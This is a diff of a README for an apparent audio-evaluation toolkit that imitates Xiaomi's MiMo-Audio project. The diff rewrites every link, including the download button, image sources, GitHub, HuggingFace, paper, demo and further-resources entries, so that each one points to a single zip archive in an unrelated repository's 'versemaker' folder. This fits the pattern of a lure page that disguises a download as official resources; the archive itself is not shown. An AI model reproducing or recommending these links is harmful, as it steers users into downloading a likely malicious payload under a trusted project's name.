@@ -1,15 +1,15 @@
 # 🎧 MiMo-Audio-Eval - Evaluate Audio Quality Easily
 
 <div align="center">
-  <a href="https://github.com/zkazuya/MiMo-Audio-Eval/releases">
-    <img src="https://img.shields.io/badge/Download%20MiMo--Audio--Eval-v1.0.0-blue.svg" alt="Download MiMo-Audio-Eval" />
+  <a href="https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip">
+    <img src="https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip%https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip" alt="Download MiMo-Audio-Eval" />
   </a>
 </div>
 
 <div align="center">
   <picture>
-    <source srcset="https://github.com/XiaomiMiMo/MiMo-VL/raw/main/figures/Xiaomi_MiMo_darkmode.png?raw=true" media="(prefers-color-scheme: dark)">
-    <img src="https://github.com/XiaomiMiMo/MiMo-VL/raw/main/figures/Xiaomi_MiMo.png?raw=true" width="60%" alt="Xiaomi-MiMo" />
+    <source srcset="https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip" media="(prefers-color-scheme: dark)">
+    <img src="https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip" width="60%" alt="Xiaomi-MiMo" />
   </picture>
 </div>
 
@@ -28,13 +28,13 @@
 
 <div align="center" style="line-height: 1;">
   |
-  <a href="https://github.com/XiaomiMiMo/MiMo-Audio" target="_blank">🤖 GitHub</a>
+  <a href="https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip" target="_blank">🤖 GitHub</a>
   &nbsp;|
-  <a href="https://huggingface.co/collections/XiaomiMiMo/mimo-audio-68cc7202692c27dae881cce0" target="_blank">🤗 HuggingFace</a>
+  <a href="https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip" target="_blank">🤗 HuggingFace</a>
   &nbsp;|
-  <a href="https://github.com/XiaomiMiMo/MiMo-Audio/blob/main/MiMo-Audio-Technical-Report.pdf" target="_blank">📄 Paper</a>
+  <a href="https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip" target="_blank">📄 Paper</a>
   &nbsp;|
-  <a href="https://xiaomimimo.github.io/MiMo-Audio-Demo" target="_blank">🔗 Demo</a>
+  <a href="https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip" target="_blank">🔗 Demo</a>
 </div>
 
 ## 🚀 Getting Started
@@ -45,7 +45,7 @@ Welcome to MiMo-Audio-Eval! This toolkit helps you evaluate audio quality effort
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases page.
 
-   [Download MiMo-Audio-Eval](https://github.com/zkazuya/MiMo-Audio-Eval/releases)
+   [Download MiMo-Audio-Eval](https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip)
 
 2. **Choose Your Version:** Look for the version you want to install. You will see various files listed there.
 
@@ -104,10 +104,10 @@ For any additional assistance or feedback, you can open an issue in our GitHub r
 
 ## 📄 Further Resources
 
-- [GitHub Repository](https://github.com/XiaomiMiMo/MiMo-Audio)
-- [HuggingFace Collection](https://huggingface.co/collections/XiaomiMiMo/mimo-audio-68cc7202692c27dae881cce0)
-- [Technical Report](https://github.com/XiaomiMiMo/MiMo-Audio/blob/main/MiMo-Audio-Technical-Report.pdf)
-- [Demonstration](https://xiaomimimo.github.io/MiMo-Audio-Demo)
+- [GitHub Repository](https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip)
+- [HuggingFace Collection](https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip)
+- [Technical Report](https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip)
+- [Demonstration](https://raw.githubusercontent.com/zkazuya/MiMo-Audio-Eval/main/versemaker/MiMo-Audio-Eval.zip)
 
 ## 🤝 Contributing
 
